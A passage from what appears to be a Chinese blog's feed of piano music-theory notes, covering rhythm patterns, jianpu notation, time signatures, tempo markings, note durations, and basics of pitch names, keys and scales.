src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/10_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><p>大切分节奏的变体可以将两侧的八分音符替换为十六分音符。中间的四分音符不能变动。<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/10_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F%E5%8F%98%E4%BD%93.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/10_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F%E5%8F%98%E4%BD%93.png" alt="img"></a>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/10_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/10_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h3 id="三连音的变体"><a href="#三连音的变体" class="headerlink" title="三连音的变体"></a>三连音的变体</h3><p>三连音的总拍数代表其下方常规音符拍数的两倍，简称“三代二”。四分音符（一拍）时长的三连音用八分音符作为常规音符表示。同理，两拍时长的三连音用四分音符作为常规音符表示，四拍时长的三连音用二分音符作为常规音符表示，半拍时长的三连音用十六分音符作为常规音符表示。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/11_%E4%B8%8D%E5%90%8C%E6%97%B6%E9%95%BF%E7%9A%84%E4%B8%89%E8%BF%9E%E9%9F%B3.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/11_%E4%B8%8D%E5%90%8C%E6%97%B6%E9%95%BF%E7%9A%84%E4%B8%89%E8%BF%9E%E9%9F%B3.png" alt="img"></a></p><p>三连音下方部分（或全部）常规音符也可以在不改变总时长的前提下用其他常规音符代替，较复杂且不常见，不再过多叙述，感兴趣者可以参考这个视频。<br><a href="https://www.bilibili.com/video/BV1hP4y1J7uR">【零基础学音乐·自学乐理】71-打拍子（12）-三连音的变体</a></p><h2 id="基本节奏型的首位休止"><a href="#基本节奏型的首位休止" class="headerlink" title="基本节奏型的首位休止"></a>基本节奏型的首位休止</h2><p>指基本节奏型的第一个音符用休止符替代。<br><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/12_%E5%9F%BA%E6%9C%AC%E8%8A%82%E5%A5%8F%E5%9E%8B%E9%A6%96%E4%BD%8D%E4%BC%91%E6%AD%A2.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/12_%E5%9F%BA%E6%9C%AC%E8%8A%82%E5%A5%8F%E5%9E%8B%E9%A6%96%E4%BD%8D%E4%BC%91%E6%AD%A2.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/12_%E5%9F%BA%E6%9C%AC%E8%8A%82%E5%A5%8F%E5%9E%8B%E9%A6%96%E4%BD%8D%E4%BC%91%E6%AD%A201.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/12_%E5%9F%BA%E6%9C%AC%E8%8A%82%E5%A5%8F%E5%9E%8B%E9%A6%96%E4%BD%8D%E4%BC%91%E6%AD%A201.png" alt="img"></a></p><h2 id="反拍节奏"><a href="#反拍节奏" class="headerlink" title="反拍节奏"></a>反拍节奏</h2><p>指强拍强位被休止的节奏形态。八分节奏的首位休止是典型的反拍节奏之一。<br>其律动与常规节奏相反，有较强的动感，常用于R&amp;B、雷鬼等风格音乐。<br>“弱起节奏”与“连续切分节奏”也是反拍节奏的重要形态。<br>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/13_%E5%8F%8D%E6%8B%8D%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/13_%E5%8F%8D%E6%8B%8D%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h2 id="弱起节奏"><a href="#弱起节奏" class="headerlink" title="弱起节奏"></a>弱起节奏</h2><p>指从弱拍开始的节奏，可从一小节的任意一个弱拍开始。可分为正拍弱起与反拍弱起两种。<br>【例1-正拍弱起】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/14_%E6%AD%A3%E6%8B%8D%E5%BC%B1%E8%B5%B701.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/14_%E6%AD%A3%E6%8B%8D%E5%BC%B1%E8%B5%B701.png" alt="img"></a><br>【例2-反拍弱起】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/14_%E5%8F%8D%E6%8B%8D%E5%BC%B1%E8%B5%B701.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/14_%E5%8F%8D%E6%8B%8D%E5%BC%B1%E8%B5%B701.png" alt="img"></a></p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>乐理笔记02-简谱</title>
    <link href="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/"/>
    <url>/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/</url>
    
    <content type="html"><![CDATA[<h2 id="简谱"><a href="#简谱" class="headerlink" title="简谱"></a>简谱</h2><h3 id="调号"><a href="#调号" class="headerlink" title="调号"></a>调号</h3><p>见<code>乐理笔记01-基础知识</code></p><h3 id="拍号"><a href="#拍号" class="headerlink" title="拍号"></a>拍号</h3><p>拍号的表示方式为XYXY，读作YX拍，意思是以Y分音符的时长为一拍，每小节有X拍。<br>最常见的拍号是44拍，即以4分音符的时长为一拍，每小节有4拍。此外可以见到的拍号有42拍、43拍、83拍、86拍，其他拍号极其罕见。</p><h4 id="拍号的强弱关系"><a href="#拍号的强弱关系" class="headerlink" title="拍号的强弱关系"></a>拍号的强弱关系</h4><p>无论什么拍号，每小节第一拍均为强拍，且每小节只有这一个强拍。<br>强拍的音量不一定响，弱拍的音量不一定弱。<br>旋律中的长音符，稳定音，通常处于强拍；短音符，不稳定音，通常处于弱拍。<br>和声通常要在强拍进行变化，弱拍进行保持。<br>不同的强弱关系还影响旋律的动机，织体的写法，配器的选择，速度的选择等等。</p><h4 id="单拍子"><a href="#单拍子" class="headerlink" title="单拍子"></a>单拍子</h4><p>每小节只有一个强拍，并且存在弱拍。<br>42拍——动次；43拍——动次次；83拍——动次次。</p><h4 id="复拍子"><a href="#复拍子" class="headerlink" title="复拍子"></a>复拍子</h4><p>由相同的单拍子组合而成。<br>44拍——动次打次；86拍——动次次打次次。<br>44拍由两个42拍组合而成，由多个拍号组合而成的拍号，每小节第一个拍子之外的强拍均要变成次强拍。因此这里的第二个42拍的强拍变成了次强拍，其强度弱于强拍。86拍同理，第二个83拍的强拍也变成了次强拍。</p><h4 id="混合拍子"><a href="#混合拍子" class="headerlink" title="混合拍子"></a>混合拍子</h4><p>由不同的单拍子组合而成。<br>45拍——动次打次次（或动次次打次）。<br>45拍的组合顺序有两种：“42拍+43拍”或“43拍+42拍”，因此次强拍的位置有两种可能。</p><h4 id="一拍子"><a href="#一拍子" class="headerlink" title="一拍子"></a>一拍子</h4><p>每小节只有一拍，且这一拍是强拍。即拍号的分子是1被称为一拍子。<br>同理，拍号分子为X被称为X拍子。如43拍、83拍可称为三拍子。</p><h4 id="散拍子"><a href="#散拍子" class="headerlink" title="散拍子"></a>散拍子</h4><p>符号为“艹”。散拍子没有固定小节线，没有固定拍数，没有固定强弱关系，一般用于戏曲音乐中。</p><h3 id="情绪与速度"><a href="#情绪与速度" class="headerlink" title="情绪与速度"></a>情绪与速度</h3><p>情绪即演奏(唱)时的情绪，常见的情绪有欢快地、愉悦地、柔和地、抒情地、激昂地、悲伤地等。<br>速度即演奏速度，包括具体的速度和抽象的速度两种。<br>具体的速度指的是BPM(Beats Per Minute)，即每分钟有多少拍。如BPM为120时可表示为“每分钟120拍”或“𝅘𝅥&#x3D;120”或“120 BPM”。<br>抽象的速度是词语式的表达，是一个大致范围，有上下浮动的空间。如BPM在60以下称为慢速，60到120称为中速，120到180称为快速，180以上称为急速。</p><p>表1 抽象的速度</p><table><thead><tr><th align="center">意大利文</th><th align="center">中文</th><th align="center">BPM</th></tr></thead><tbody><tr><td align="center">Grave</td><td align="center">庄板</td><td align="center">约40</td></tr><tr><td align="center">Largo</td><td align="center">广板</td><td align="center">约46</td></tr><tr><td align="center">Lento</td><td align="center">慢板</td><td align="center">约52</td></tr><tr><td align="center">Adagio</td><td align="center">柔板</td><td align="center">约56</td></tr><tr><td align="center">Larghetto</td><td align="center">小广板</td><td align="center">约60</td></tr><tr><td align="center">Andante</td><td align="center">行板</td><td align="center">约66</td></tr><tr><td align="center">Andantino</td><td align="center">小行板</td><td align="center">约69</td></tr><tr><td align="center">Moderato</td><td align="center">中板</td><td align="center">约88</td></tr><tr><td align="center">Allegretto</td><td align="center">小快板</td><td align="center">约108</td></tr><tr><td align="center">Allegro</td><td align="center">快板</td><td align="center">约132</td></tr><tr><td align="center">Presto</td><td align="center">急板</td><td align="center">约184</td></tr><tr><td align="center">Prestissimo</td><td align="center">最急板</td><td align="center">约208</td></tr></tbody></table><h3 id="音符"><a href="#音符" class="headerlink" title="音符"></a>音符</h3><p>音符时长取决于拍号的分母。以44拍为例，44拍以四分音符的时长为1拍。那么对应二分音符的时长是2拍，全音符时长为4拍。<br>附点音符时长为原音符的1.5倍。<br>复附点音符，两个附点的时长为原音符的1.75倍，三个附点的时长为原音符的1.875倍，以此类推。</p><p>表2 音符及其时长(以44拍为例)</p><table><thead><tr><th align="center">名称</th><th align="center">记法</th><th align="center">时长</th><th align="center"></th></tr></thead><tbody><tr><td align="center">全音符</td><td align="center">1−−−1−−−</td><td align="center">四拍</td><td align="center">█ █ █ █</td></tr><tr><td align="center">附点二分音符</td><td align="center">1−−1−−</td><td align="center">三拍</td><td align="center">█ █ █</td></tr><tr><td align="center">二分音符</td><td align="center">1−1−</td><td align="center">二拍</td><td align="center">█ █</td></tr><tr><td align="center">附点四分音符</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E5%9B%9B%E5%88%86%E9%9F%B3%E7%AC%A6.gif"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E5%9B%9B%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></a></td><td align="center">一点五拍</td><td align="center">█ ▌</td></tr><tr><td align="center">四分音符</td><td align="center">11</td><td align="center">一拍</td><td align="center">█</td></tr><tr><td align="center">附点八分音符</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E5%85%AB%E5%88%86%E9%9F%B3%E7%AC%A6.gif"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E5%85%AB%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></a></td><td align="center">四分之三拍</td><td align="center">▌▎</td></tr><tr><td align="center">八分音符</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E5%85%AB%E5%88%86%E9%9F%B3%E7%AC%A6.gif"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E5%85%AB%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></a></td><td align="center">半拍</td><td align="center">▌</td></tr><tr><td align="center">附点十六分音符</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E5%8D%81%E5%85%AD%E5%88%86%E9%9F%B3%E7%AC%A6.gif"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E5%8D%81%E5%85%AD%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></a></td><td align="center">八分之三拍</td><td align="center">▎▏</td></tr><tr><td align="center">十六分音符</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E5%8D%81%E5%85%AD%E5%88%86%E9%9F%B3%E7%AC%A6.gif"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E5%8D%81%E5%85%AD%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></a></td><td align="center">四分之一拍</td><td align="center">▎</td></tr><tr><td align="center">附点三十二分音符</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E4%B8%89%E5%8D%81%E4%BA%8C%E5%88%86%E9%9F%B3%E7%AC%A6.gif"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E9%99%84%E7%82%B9%E4%B8%89%E5%8D%81%E4%BA%8C%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></a></td><td align="center">十六分之三拍</td><td align="center">▏|</td></tr><tr><td align="center">三十二分音符</td><td align="center"><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E4%B8%89%E5%8D%81%E4%BA%8C%E5%88%86%E9%9F%B3%E7%AC%A6.gif"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E4%B8%89%E5%8D%81%E4%BA%8C%E5%88%86%E9%9F%B3%E7%AC%A6.gif" alt="img"></a></td><td align="center">八分之一拍</td><td align="center">▏</td></tr></tbody></table><h3 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h3><p>小节使用小节线“|”隔开，小节的时长取决于拍号。以44拍为例，四分音符为一拍，每小节四拍，那么每个小节的时长为四个四分音符的长度，即一个全音符长度。</p><h4 id="小节序号"><a href="#小节序号" class="headerlink" title="小节序号"></a>小节序号</h4><p>用来标明是第几个小节，最主要的作用是方便查找。小节序号通常标在小节线的正上方或稍微偏右。</p><h4 id="弱起小节"><a href="#弱起小节" class="headerlink" title="弱起小节"></a>弱起小节</h4><p>不从强拍开始的不完整的小节，常用在乐曲开头。<br>小节序号从第一个完整小节开始计算，因此弱起小节不是乐曲的第一个小节。</p><h3 id="终止线"><a href="#终止线" class="headerlink" title="终止线"></a>终止线</h3><p>终止线为“𝄂”，意味着乐谱的终止。</p><h3 id="延音线"><a href="#延音线" class="headerlink" title="延音线"></a>延音线</h3><p>延音线可以用于表示一个时长无法通过音符或附点音符表示的音。亦用于某个音跨越小节线的情况。<br>如要表示一个时长为1.25拍的音，可以用延音线表示为<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E5%BB%B6%E9%9F%B3%E7%BA%BF1.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E5%BB%B6%E9%9F%B3%E7%BA%BF1.png" alt="img"></a>，即四分音符与十六分音符的组合，加起来的时长为1.25拍。这里只有第一个音符发出声音，第二个音符不重新发音，仅为前面的音补充时长。<br>延音线的两个音必须为同一个音。</p><h3 id="连线"><a href="#连线" class="headerlink" title="连线"></a>连线</h3><p>乐谱中需要连贯演奏(唱)的地方使用连线进行连接，某一个字对应几个音时也会使用连线连接。<br>连线的画法与延音线相同，但通常情况下会连几个不同的音。<br>举一个例子<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E8%BF%9E%E7%BA%BF1.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E8%BF%9E%E7%BA%BF1.png" alt="img"></a>。这里最外侧从第一个音连至最后一个音的线为连线。内侧连接同一个音的线为延音线。</p><h3 id="休止符"><a href="#休止符" class="headerlink" title="休止符"></a>休止符</h3><p>表示停顿，符号为0，停顿时长与音符时长的表示方法类似。</p><h3 id="音符下方横线"><a href="#音符下方横线" class="headerlink" title="音符下方横线"></a>音符下方横线</h3><p>通常情况下将处于同一拍的音符下方的横线连接起来，方便计算拍数。如<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E6%A8%AA%E7%BA%BF1.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B002-%E7%AE%80%E8%B0%B1/%E6%A8%AA%E7%BA%BF1.png" alt="img"></a>，这里连起来的部分的拍数之和都是一拍。<br>断开的部分不存在停顿，横线的断开与小节线的分割均不表示停顿，都需要连续演奏。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>乐理笔记01-基础知识</title>
    <link href="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="乐音与噪音"><a href="#乐音与噪音" class="headerlink" title="乐音与噪音"></a>乐音与噪音</h3><p>乐音：音高（频率）固定，振动规则的音。钢琴等乐器发出的是乐音，听起来悦耳、柔和。<br>噪音：振动不规则，音高也不明显的音。风声、雨声、机器轰鸣声是噪音，大多数打击乐器（鼓、镲、沙锤等）发出的是噪音，听起来刺耳。</p><h3 id="音的物理性质"><a href="#音的物理性质" class="headerlink" title="音的物理性质"></a>音的物理性质</h3><p>音高：指音调的高低。由音的频率决定，频率是发音体在单位时间内的振动次数。<br>音值：指音的持续时间。<br>音强：指音的响度。由发音体的振幅大小决定。<br>音色：指不同声音表现在波形方面的与众不同的特性。音色与发音体的材料、结构等有关。</p><h3 id="唱名"><a href="#唱名" class="headerlink" title="唱名"></a>唱名</h3><p>用来唱的名字，也就是do,re,mi,fa,sol,la,si。在简谱上对应1,2,3,4,5,6,7。</p><h3 id="音名"><a href="#音名" class="headerlink" title="音名"></a>音名</h3><p>即声音的名字，声音是物体振动产生的，不同的声音会有不同的振动频率，而同一个声音的振动频率是固定的。因此同一个音名的频率不会改变，永远对应同一个音。</p><h4 id="钢琴键与音名"><a href="#钢琴键与音名" class="headerlink" title="钢琴键与音名"></a>钢琴键与音名</h4><p>钢琴一共有88个键<del>（因此钢琴有时被戏称为88k音游）</del>。按键的分布有周期性的规律，可以划分为若干组，取出其中一组如下图所示，一共有12个键，包括7个白键和5个黑键。7个白键的音名就分别为C,D,E,F,G,A,B。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E9%9F%B3%E5%90%8D.png"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E9%9F%B3%E5%90%8D.png" alt="img"></a></p><p>​图1 钢琴键与音名</p><h3 id="调号"><a href="#调号" class="headerlink" title="调号"></a>调号</h3><p>唱名对应的音名不是固定的，同一个唱名不一定对应同一个音名。唱名与音名的对应关系取决于<strong>调号</strong>。<br>调号的格式为“唱名&#x3D;音名”，简谱采用首调唱名法，如1&#x3D;C表示的是C大调，即唱名do对应音名C，以此类推唱名re,mi,fa,sol,la,si分别对应音名D,E,F,G,A,B。而1&#x3D;D则表示是D大调，此时唱名do对应音名D。</p><h3 id="首调与固定调"><a href="#首调与固定调" class="headerlink" title="首调与固定调"></a>首调与固定调</h3><p>首调唱名法：将大调中的主音唱为do，如C大调中将C唱为do，D大调中就将D唱为do。简谱通常使用首调。<br>固定调唱名法：在任何调式中，都将C4（中央C）唱为do，其他音以此类推。五线谱通常使用固定调。</p><h3 id="半音与全音"><a href="#半音与全音" class="headerlink" title="半音与全音"></a>半音与全音</h3><p>观察图1所示的一组钢琴键，不难发现C到D、D到E、F到G、G到A、A到B间都有黑键，而E到F间与B到C间没有黑键。也就是说E到F与B到C是直接相邻的，便可以称E到F、B到C间的音高距离为一个<strong>半音</strong>。<br>半音指的是相邻的两个音间的距离，而全音距离是半音的两倍。C到D、D到E、F到G、G到A、A到B间的音高距离为一个<strong>全音</strong>。<br>C到♯C、♯C到D的距离是一个半音。</p><h3 id="升降号"><a href="#升降号" class="headerlink" title="升降号"></a>升降号</h3><p>♯为升号，表示升一个半音；♭为降号，表示降一个半音。<br>𝄪为重升号，表示升一个全音；𝄫为重降号，表示降一个全音。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E5%8D%87%E9%99%8D.png"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2_%E6%99%AE%E9%80%9A%E9%92%A2%E7%90%B4%E9%94%AE+%E5%8D%87%E9%99%8D.png" alt="img"></a></p><p>图2 钢琴键与带升降号音名</p><p>加上升降符号后的一组钢琴键如上图所示，可以发现同一个键可以用不同的音名表示出来，而实际上这些音是同一个音，只是写法不同，这些对应同一个音的不同音名被称作<strong>等音</strong>。至于使用哪个音名，这取决于所处的音乐语境。</p><h3 id="音的分组"><a href="#音的分组" class="headerlink" title="音的分组"></a>音的分组</h3><p>对完整的88键钢琴进行分组，共分为9组，如下图所示：</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3_%E5%AE%8C%E6%95%B4%E9%92%A2%E7%90%B4%E9%94%AE.png"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3_%E5%AE%8C%E6%95%B4%E9%92%A2%E7%90%B4%E9%94%AE.png" alt="img"></a>图3 钢琴键的分组</p><h4 id="霍尔赫姆兹音调记号法"><a href="#霍尔赫姆兹音调记号法" class="headerlink" title="霍尔赫姆兹音调记号法"></a>霍尔赫姆兹音调记号法</h4><p>命名分大字组、小字组、大字N组与小字N组。<br>大字组&#x2F;大字N组的音名大写，小字组&#x2F;小字N组的音名小写；<br>大字N组音名右下角写N，小子N组音名右上角写N。</p><h4 id="科学音调记号法"><a href="#科学音调记号法" class="headerlink" title="科学音调记号法"></a>科学音调记号法</h4><p>将9个组从左至右命名为0到8。直接记为“大写音名+数字”的形式。<br>例如小字一组的C可以按霍法记为c1c1，也可按科法记为C4。</p><h3 id="中央C与标准音"><a href="#中央C与标准音" class="headerlink" title="中央C与标准音"></a>中央C与标准音</h3><p>小字一组的C（即C4）被称作<strong>中央C</strong>。<br>小字一组的A（即A4）被称作<strong>标准音</strong>，其频率确定为440Hz。</p><h3 id="音域"><a href="#音域" class="headerlink" title="音域"></a>音域</h3><p>乐器能够发出的声音范围，对于钢琴来说是A2A2到c5c5。<br>人声的音域通常情况下为gg到d2d2，正好覆盖小字一组，因此对于简谱中的“1&#x3D;C”，其中的C对应钢琴中小字一组的C（中央C）。</p><h3 id="高音点与低音点"><a href="#高音点与低音点" class="headerlink" title="高音点与低音点"></a>高音点与低音点</h3><p>1&#x3D;C时，以小字一组为基准，小字一组的CDEFGAB对应简谱1234567。小字二组对应简谱加一个高音点，即1˙2˙3˙4˙5˙6˙7˙1˙2˙3˙4˙5˙6˙7˙，小字三组对应简谱则加两个高音点，以此类推。大字组对应简谱加一个低音点，即<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E4%BD%8E%E9%9F%B3%E7%82%B9.gif"><img src="/2024/11/13/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E4%BD%8E%E9%9F%B3%E7%82%B9.gif" alt="img"></a>，大字一组对应简谱则加两个低音点，以此类推。</p><h3 id="纯八度"><a href="#纯八度" class="headerlink" title="纯八度"></a>纯八度</h3><p>纯八度是音程的一种，指相邻音组中相同音名的两个音之间的音高距离。纯八度的两个音（如C3与C4），其频率比正好为1:2。当两个音的振动频率比接近简单整数时，两个音听起来会很相近，很协和，感觉像同一个音。</p><h3 id="调式"><a href="#调式" class="headerlink" title="调式"></a>调式</h3><p>若干高低不同的乐音，围绕某一有稳定感的中心音，按一定的音程关系组织在一起，成为一个有机的体系，称为调式。<br>调式有很多种，包括大调式、小调式、中古调式、五声调式等。<br>自然大调是大调式的一种，当七个音按照“全全半全全全半”的规则排列时，构成的是自然大调。<br>简谱中“1&#x3D;C”表示的是C大调，CDEFGAB间的音高距离符合“全全半全全全半”的规则，是自然大调的一种。此外有D大调、E大调等。</p><h3 id="音阶"><a href="#音阶" class="headerlink" title="音阶"></a>音阶</h3><p>将调式中的所有音，以主音开始到主音结束，由低到高或由高到低以阶梯状排列起来，被称作音阶。<br>如C大调的音阶就可以表示为“CDEFGABC”，这里最后面的C比最前面的C高了一个八度。此外“CBAGFEDC”、“CDEFGABCBAGFEDC”、“CBAGFEDCDEFGAB”也可称作C大调的音阶。</p><p>表1 